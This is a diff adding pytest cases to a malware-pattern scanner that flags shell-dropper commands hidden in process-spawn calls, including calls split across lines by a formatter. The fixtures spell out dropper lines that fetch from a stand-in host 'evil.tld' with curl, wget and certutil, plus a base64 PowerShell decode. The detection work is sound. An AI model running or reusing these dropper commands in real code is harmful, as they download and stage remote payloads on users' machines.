@@ -20,6 +20,7 @@ shipped copy could diverge without any test noticing.
 
 import re
 import time
+from dataclasses import replace
 from pathlib import Path
 
 import pytest
@@ -1697,6 +1698,179 @@ def test_the_shell_payload_check_stops_after_the_argv_line_budget():
 
     assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(near)
     assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(far)
+
+
+# ---------------------------------------------------------------------------
+# F58 — the argv's own brackets are the bound, where a character class cannot be
+#
+# F43's cross-line branch excludes `;` and `=` so it cannot walk into the next
+# statement, and the price was exact: `spawn("powershell.exe", ["-Command",
+# "$u='http://evil.tld'; curl $u"])` matched on ONE line (branch 1's window
+# crosses both characters) and not once prettier split it — the same asymmetry
+# F43 existed to remove, surviving inside its own class. A `=` inside the call's
+# parentheses is not a new statement and one outside them always is, which is a
+# bracket depth and not a character class. The scan supplements the regex rather
+# than replacing it, so it can only add hits, and it stops at the `)` that
+# closes the call — a tighter bound than the line window it backs up.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        # The shape the follow-up measured as missed, verbatim.
+        'spawn("powershell.exe", [\n'
+        '    "-Command",\n'
+        "    \"$u='http://evil.tld'; curl $u\"\n"
+        "]);\n",
+        # The POSIX spelling of the same dropper.
+        "spawn('/bin/sh', [\n"
+        "    '-c',\n"
+        "    'u=http://evil.tld/a; wget $u -O /tmp/a'\n"
+        "]);\n",
+        # An encoded PowerShell payload behind an assignment.
+        "execFile('pwsh.exe', [\n"
+        "    '-NoProfile',\n"
+        '    "$p=$args[0]; [Convert]::FromBase64String($p)"\n'
+        "]);\n",
+        # A `;` between the binary and the payload, without an argv array.
+        'execSync("cmd.exe",\n'
+        '    "/c set U=http://evil.tld; certutil -urlcache -f %U% a.exe"\n'
+        ");\n",
+    ],
+)
+def test_a_payload_behind_an_assignment_in_the_argv_is_reported(code):
+    """The F58 gap, closed: `=` and `;` no longer end the reach inside a call."""
+    assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(code), code
+
+
+def test_the_formatted_and_one_line_spellings_now_agree():
+    """The whole point: prettier is not a detection boundary."""
+    one_line = "spawn(\"powershell.exe\", [\"-Command\", \"$u='http://x.tld'; curl $u\"]);"
+    formatted = (
+        'spawn("powershell.exe", [\n'
+        '    "-Command",\n'
+        "    \"$u='http://x.tld'; curl $u\"\n"
+        "]);\n"
+    )
+
+    assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(one_line)
+    assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(formatted)
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        # The call closes before the payload, so the payload is another
+        # statement — which the bracket scan enforces structurally rather than
+        # by forbidding a character.
+        "spawn('/bin/bash', ['-c', script]);\n"
+        "const url = 'http://x.tld';\n"
+        "const tool = 'curl';\n",
+        "execSync('cmd.exe /c chcp 65001')\n"
+        "u = 'http://x.tld'\n"
+        "wget(u)\n",
+        # Every false danger the 2,080-package sweep found, re-asserted through
+        # the structural reader: the regex misses them, so this is what runs.
+        'exec("powershell.exe", ["-NoProfile", "-NonInteractive", "-Command",'
+        ' "Get-Command pwsh.exe"]);',
+        'spawn("cmd.exe", ["/C", editor].concat(args), { stdio: "inherit" });',
+        "execSync('bash -ec \"npm run build\"');",
+        # A build step whose argv genuinely contains an assignment.
+        "spawn('/bin/sh', [\n"
+        "    '-c',\n"
+        "    'NODE_ENV=production npm run build'\n"
+        "]);\n",
+    ],
+)
+def test_the_argv_scan_reports_nothing_new_on_ordinary_code(code):
+    assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(code), code
+
+
+def test_the_argv_scan_honours_the_same_line_budget_as_the_regex():
+    """One bound, spelled once: the scan reuses `SHELL_ARGV_LINES`."""
+    near = (
+        'spawn("cmd.exe", [\n'
+        + '    "/C", "x=1;",\n' * 4
+        + '    "curl http://evil.tld/a"\n]);'
+    )
+    far = (
+        'spawn("cmd.exe", [\n'
+        + '    "/C", "x=1;",\n' * 40
+        + '    "curl http://evil.tld/a"\n]);'
+    )
+
+    assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(near)
+    assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(far)
+
+
+def test_an_unclosed_call_cannot_turn_the_scan_into_a_file_wide_search():
+    """Both budgets are backstops for the `)` that never arrives.
+
+    The line budget stops a call left open across a file; the byte budget stops
+    one left open along a single (minified) line, where no newline ever comes.
+    """
+    across_lines = 'spawn("cmd.exe", [\n' + "// x\n" * 200 + "curl http://evil.tld/a\n"
+    along_one_line = 'spawn("cmd.exe", [' + '"x", ' * 400 + '"curl http://evil.tld/a"]);'
+
+    assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(across_lines)
+    assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(along_one_line)
+
+
+@pytest.mark.parametrize(
+    "name",
+    ["exec", "execSync", "execFile", "execFileSync", "spawn", "spawnSync"],
+)
+def test_the_factored_call_prefix_accepts_exactly_what_the_pattern_does(name):
+    """Anti-drift: a name added to one prefix and not the other is a hole.
+
+    The scan spells the call names with their shared prefixes factored out
+    because a flat alternation costs 40% more, so the two spellings must be
+    asserted equal rather than assumed so.
+    """
+    call = f"{name}('/bin/sh', ['-c', 'curl http://evil.tld/a'])"
+
+    assert re.search(sandbox_check._PROCESS_CALL, call), call
+    assert re.search(sandbox_check._PROCESS_CALL_FACTORED, call), call
+    assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(call), call
+
+
+@pytest.mark.parametrize("name", ["execa", "spawner", "notexec", "respawn"])
+def test_the_factored_call_prefix_is_no_wider_than_the_pattern(name):
+    """Factoring must not have turned the names into prefixes of themselves."""
+    call = f"{name}('/bin/sh', [\n  '-c',\n  'u=1; curl http://evil.tld/a'\n])"
+
+    assert not re.search(sandbox_check._PROCESS_CALL, call), call
+    assert not re.search(sandbox_check._PROCESS_CALL_FACTORED, call), call
+    assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(call), call
+
+
+def test_the_structural_reader_runs_only_where_the_regex_missed(monkeypatch):
+    """A file the regex already flags must not pay for a second pass."""
+    calls: list = []
+    pattern = next(
+        entry for entry in MALWARE_PATTERN_TABLE if entry.description == SHELL_DESCRIPTION
+    )
+    assert pattern.structural is not None
+    # `structural` is captured by value when the table is compiled, so the
+    # counter has to replace the entry the scan actually consults.
+    counted = replace(pattern, structural=lambda text: bool(calls.append(text)))
+    monkeypatch.setattr(
+        sandbox_check,
+        "_COMPILED_MALWARE_PATTERNS",
+        tuple(
+            (compiled, counted if entry is pattern else entry)
+            for compiled, entry in sandbox_check._COMPILED_MALWARE_PATTERNS
+        ),
+    )
+
+    # The regex matches this one, so the second reader is never reached.
+    scan_text_for_malware_patterns("execSync('/bin/sh', []);")
+    assert calls == []
+
+    # It misses this one, so the second reader gets its turn.
+    scan_text_for_malware_patterns("spawn('git', ['status']);")
+    assert len(calls) == 1
 
 
 def test_windows_support_code_no_longer_escalates_its_own_capabilities():
